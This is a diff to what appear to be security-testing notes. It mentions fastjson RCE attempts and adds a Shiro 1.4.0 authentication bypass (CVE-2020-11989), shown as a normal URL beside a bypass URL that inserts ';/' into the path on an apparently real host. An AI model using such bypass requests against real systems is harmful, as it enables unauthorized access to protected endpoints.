@@ -63,4 +63,8 @@ we try the fastjson 1.2.47 RCE, but failed. so we try the `1.2.56` version.su
 
 ### Shiro 1.4.0
 
-have the auth bypass vulnerability. CVE-2020-11989, the reference is [here](https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA).
+have the auth bypass vulnerability. CVE-2020-11989, the reference is [here](https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA). 
+
+normal request `https://web.antgst.com/antgst/sms/otp/monitoring/getHourTotal`
+
+bypass request `https://web.antgst.com/antgst/;/sms/otp/monitoring/getHourTotal`
